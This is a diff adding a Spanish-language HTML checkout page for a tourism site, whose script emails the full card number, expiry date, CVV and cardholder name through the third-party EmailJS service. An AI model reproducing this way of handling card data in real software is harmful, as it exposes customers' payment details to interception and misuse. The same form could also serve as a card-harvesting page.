@@ -1,0 +1,63 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Pago</title>
+  <link rel="stylesheet" href="Style.css" />
+  <script src="https://cdn.emailjs.com/dist/email.min.js"></script>
+</head>
+<body>
+  <header>
+    <div class="header-content">
+      <h1>Realiza tu Pago</h1>
+    </div>
+  </header>
+
+  <section>
+    <form id="formPago">
+      <input type="text" name="nombre_tarjeta" placeholder="Nombre en la tarjeta" required />
+      <input type="text" name="numero_tarjeta" placeholder="Número de tarjeta" required maxlength="19" />
+      <input type="text" name="fecha_expiracion" placeholder="MM/AA" required />
+      <input type="text" name="cvv" placeholder="CVV" required maxlength="4" />
+      <input type="email" name="email_usuario" placeholder="Tu correo electrónico" required />
+      <button type="submit">Pagar</button>
+    </form>
+
+    <div id="mensajeExito" style="display:none; color:green; margin-top:1rem;">
+      ✅ ¡Pago enviado correctamente! Pronto recibirás un correo de confirmación.
+    </div>
+    <div id="mensajeError" style="display:none; color:red; margin-top:1rem;">
+      ❌ Hubo un error al enviar tu pago. Intenta nuevamente.
+    </div>
+  </section>
+
+  <footer>
+    <p>&copy; 2025 Turismo San Pedro de Macorís. Todos los derechos reservados.</p>
+  </footer>
+
+  <script>
+    emailjs.init("TU_PUBLIC_KEY"); // Reemplaza con tu clave pública
+
+    const form = document.getElementById("formPago");
+    const mensajeExito = document.getElementById("mensajeExito");
+    const mensajeError = document.getElementById("mensajeError");
+
+    form.addEventListener("submit", function (e) {
+      e.preventDefault();
+
+      emailjs.sendForm("service_ev9fto9", "TU_TEMPLATE_ID", form)
+        .then(() => {
+          mensajeExito.style.display = "block";
+          mensajeError.style.display = "none";
+          form.reset();
+        })
+        .catch((error) => {
+          console.error("Error al enviar:", error);
+          mensajeError.style.display = "block";
+          mensajeExito.style.display = "none";
+        });
+    });
+  </script>
+</body>
+</html>
